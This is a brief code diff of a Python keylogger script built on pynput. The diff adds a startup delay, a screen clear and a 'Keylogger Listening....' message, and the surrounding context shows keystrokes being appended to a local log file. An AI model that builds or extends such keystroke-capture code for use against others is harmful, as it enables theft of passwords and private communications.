@@ -1,5 +1,6 @@
 from pynput import keyboard
-
+import time
+import os
 log_file = "key_log.txt"
 
 print("""
@@ -15,6 +16,9 @@ print("""
             There’s no turning back now. Are you prepared?
 """)
 
+time.sleep(2)
+os.system('cls')
+print('Keylogger Listening....')
 def on_press(key):
     try:
         with open(log_file, "a") as file:
